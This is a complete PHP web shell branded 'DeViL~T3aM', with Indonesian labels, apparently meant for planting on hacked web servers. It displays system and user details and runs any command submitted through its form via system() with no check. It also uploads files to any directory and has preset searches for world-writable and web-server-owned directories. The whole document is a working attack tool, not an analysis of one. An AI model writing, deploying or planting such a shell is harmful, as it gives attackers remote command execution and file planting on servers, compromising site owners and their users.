<html>
<head>
<title>-DeViL Was Here -r@</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<body bgcolor="#000000" text="#00FF00">
<title></title><div align="left">
  <p align="center">
<font face="trebuchet ms" size="6"><b>[<font color="#FF0000">Powered By DeViL~T3aM</font>]</b></font><p align="center">
<img src="http://ups.imagup.com/04/1242538914_i2204910.gif" width="451" height="70">
  <font face="trebuchet ms" size="6">
  
  <hr>
  <hr>
<div align="left"><b>
<?php
  closelog( );
  $user = get_current_user( );
  $login = posix_getuid( );
  $euid = posix_geteuid( );
  $ver = phpversion( );
  $gid = posix_getgid( );
  if ($chdir == "") $chdir = getcwd( );
  if(!$whoami)$whoami=exec("whoami");
?>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<?php
  $uname = posix_uname( );
  while (list($info, $value) = each ($uname)) {
?>
  <TR>
    <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><span 

style="font-size: 9pt"><b><?= $info ?>
      :</b> <?= $value ?></DIV></TD>
  </TR>
<?php
  }
?>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
    <font face="Franklin Gothic Demi Cond">
    <span style="font-size: 9pt"><b>
    Info User:</b> uid=<?= $login ?>(<?= $whoami?>) 
	euid=<?= $euid 

?>(<?= $whoami?>) gid=<?= $gid ?>(<?= $whoami?>)</span></font></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
    <font face="Franklin Gothic Demi Cond">
    <span style="font-size: 9pt"><b>
    Path Awal:</b> <?= $chdir ?></span></font></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
    <font face="Franklin Gothic Demi Cond">
    <span style="font-size: 9pt"><b>
    Permisi Direktori:</b> <? if(@is_writable($chdir)){ echo "Ya"; 

}else{ echo "Tidak"; } ?>
    </span></font></DIV></TD>
  </TR>  
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
    <font face="Franklin Gothic Demi Cond">
    <span style="font-size: 9pt"><b>
    Serper Servis:</b> <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?>
    </span></font></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
    <font face="Franklin Gothic Demi Cond">
    <span style="font-size: 9pt"><b>
    Alamat Serper:</b> <?= "$SERVER_ADDR $SERVER_NAME"; ?>
    </span></font></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
    <font face="Franklin Gothic Demi Cond">
    <span style="font-size: 9pt"><b>
    Jenis Script:</b> <?= $user ?></span></font></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
    <font face="Franklin Gothic Demi Cond">
    <span style="font-size: 9pt"><b>
    Versi PHP:</b> <?= $ver ?></span></font></DIV></TD>
  </TR>
</TABLE>
</b>
</div></font></div>

<?php

set_magic_quotes_runtime(0);

$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);

$UName  = `uname -a`;
$SCWD   = `pwd`;
$UserID = `id`;

if( $currentWD == "" ) {
    $currentWD = $SCWD;
}

if( $_POST['_act'] == "Masuk!" ) {
    $currentCMD = "ls -la";
}

if( $_POST['_act'] == "IP" ) {
    $currentCMD = "/sbin/ifconfig | grep inet";
}

if( $_POST['_act'] == "Proses" ) {
    $currentCMD = "ps -wx";
}

if( $_POST['_act'] == "777" ) {
    $currentCMD = "find / -type d -perm 777";
}

if( $_POST['_act'] == "nobody" ) {
    $currentCMD = "find / -user nobody -type d";
}

if( $_POST['_act'] == "apache" ) {
    $currentCMD = "find / -user apache -type d";
}

if( $_POST['_act'] == "httpd" ) {
    $currentCMD = "find / -user httpd -type d";
}

if( $_POST['_act'] == "www" ) {
    $currentCMD = "find / -user www -type d";
}

if( $_POST['_act'] == "www-data" ) {
    $currentCMD = "find / -user www-data -type d";
}

print "<form method=post enctype=\"multipart/form-data\"><hr><hr><table>";

print "<tr><td><b>Perintah:</b></td><td><input size=100 name=\"_cmd\" 

value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"Sikat!\"></td></tr>";

print "<tr><td><b>Pindah Direktori:</b></td><td><input size=100 name=\"_cwd\" 

value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"Masuk!\"></td></tr>";

print "<tr><td><b>Aplot File:</b></td><td><input size=88 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"Kirim!\"></td></tr>";

print "<tr><td><b>Cari :</b></td>";
print "<td><input type=submit name=_act value=\"IP\"><b> <input type=submit name=_act 

value=\"Proses\"> <input type=submit name=_act value=\"777\"> <input type=submit 

name=_act value=\"nobody\"> <input type=submit name=_act value=\"apache\"> <input 

type=submit name=_act value=\"httpd\"> <input type=submit name=_act value=\"www\"> <input type=submit name=_act value=\"www-data\"></td></tr>";

print "</table></form><hr><hr>";

$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);

if( $_POST['_act'] == "Kirim!" ) {
    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
        print "<center><b>Aplot file Ti Lala Aba!!</b></center>";
    } else {
        print "<center><pre>";
        system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
        print "</pre><b>Aplot file Silalamati, Sekaaa...!!!</b></center>";
    }    
} else {
    print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
    $currentCMD = "cd ".$currentWD.";".$currentCMD;
  system("$currentCMD 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm 
/tmp/cmdtemp");
    print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><hr><center><b>Pulito</b></center>";
}

exit;

?>